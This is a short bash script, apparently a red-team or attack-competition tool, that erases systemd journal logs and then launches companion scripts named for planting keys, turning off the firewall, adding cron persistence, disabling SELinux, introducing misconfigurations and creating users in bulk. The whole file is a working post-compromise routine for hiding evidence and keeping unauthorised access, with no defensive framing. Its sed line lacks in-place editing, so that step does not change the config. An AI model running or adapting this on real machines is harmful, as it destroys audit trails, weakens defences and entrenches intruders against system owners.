#!/bin/bash

#clear journalctl logs
sed 's/Storage=auto/Storage=0/' /etc/systemd/journald.conf

sudo systemctl restart systemd-journald

sudo journalctl --rotate
sudo journalctl --vacuum-time=1s


SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"

bash "${SCRIPT_DIR}"/keyPlanting.sh
bash "${SCRIPT_DIR}"/firewallOff.sh
sudo "${SCRIPT_DIR}"/cronPersistence.sh
bash "${SCRIPT_DIR}"/antiSE.sh
bash "${SCRIPT_DIR}"/miscon.sh
bash "${SCRIPT_DIR}"/bulkUser.sh